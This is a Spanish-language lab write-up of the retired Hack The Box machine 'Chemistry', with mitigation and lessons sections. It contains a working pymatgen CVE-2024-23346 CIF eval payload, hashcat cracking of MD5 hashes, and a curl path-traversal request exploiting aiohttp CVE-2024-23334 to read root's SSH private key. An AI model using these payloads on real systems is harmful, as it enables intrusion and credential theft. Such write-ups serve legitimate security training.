---
machine: Chemistry
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, cve, pymatgen, aiohttp, privesc]
---

# Chemistry — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El analizador de archivos CIF usa pymatgen, vulnerable a CVE-2024-23346: una expresión en `_space_group_magn.transform_BNS_Pp_abc` llega a `eval` y ejecuta comandos al visualizar la estructura. Se obtiene `app`, se crackean los MD5 de SQLite y `rosa` reutiliza su contraseña en SSH. Un panel interno en 8080 usa aiohttp 3.9.1, vulnerable a CVE-2024-23334; el traversal en `/assets/` lee la clave SSH privada de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,5000 <IP>
```

- `22/tcp` OpenSSH y `5000/tcp` Flask/Werkzeug con un analizador de CIF.
- El registro está abierto y el panel permite subir y visualizar estructuras.
- `feroxbuster` encuentra `/dashboard`, `/upload` y `/logout`.

## Enumeración

- La aplicación usa `pymatgen` para parsear CIF y muestra los datos de la estructura.
- La versión de pymatgen es anterior a la corrección de CVE-2024-23346.
- Los usuarios se guardan en SQLite y los hashes son MD5.

## Foothold

Se sube un CIF con una expresión maliciosa en `_space_group_magn.transform_BNS_Pp_abc`. Al pulsar View, `eval` la ejecuta y lanza una reverse shell como `app`.

```text
_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__(*[().__class__.__mro__[1]]+["__sub" + "classes__"])() if d.__name__ == "BuiltinImporter"][0].load_module("os").system("id");0,0,0'
```

## Movimiento lateral

`database.db` contiene usuarios y hashes MD5. Varios se crackean; la contraseña de `rosa` funciona también en la cuenta del sistema y por SSH.

```bash
sqlite3 database.db 'select username,password from users;'
hashcat -m 0 hashes.txt rockyou.txt
```

## Escalada de privilegios

`rosa` puede crear un túnel SSH al puerto 8080, donde corre un panel de monitorización como root con aiohttp 3.9.1. `add_static(..., follow_symlinks=True)` permite `../` en `/assets/` y leer `/root/.ssh/id_rsa`.

```bash
ssh -L 8888:127.0.0.1:8080 rosa@<IP>
curl --path-as-is 'http://localhost:8888/assets/../../../../root/.ssh/id_rsa'
```

## Evidencia

- CIF malicioso y ejecución de `id` al visualizarlo.
- Hashes MD5 crackeados y SSH como `rosa`.
- Túnel al 8080 y traversal en `/assets/`.
- Clave privada de root leída y sesión SSH root.

## Lecciones aprendidas

- Parsear formatos científicos con `eval` convierte un archivo en ejecución remota.
- Los hashes MD5 sin sal se crackean con diccionarios.
- Un servicio interno puede tener una versión vulnerable aunque el principal esté parcheado.

## Mitigación y detección

- Actualizar pymatgen y sustituir `eval` por un parser seguro.
- Usar bcrypt/Argon2 y no reutilizar contraseñas de aplicación en el sistema.
- Actualizar aiohttp y no servir estáticos con `follow_symlinks`.

## Referencias

- [0xdf — Chemistry](https://0xdf.gitlab.io/2025/03/08/htb-chemistry.html)
- [IppSec — Chemistry](https://www.youtube.com/watch?v=OH00LkpHyLk)
- [Hack The Box — Chemistry](https://app.hackthebox.com/machines/chemistry)
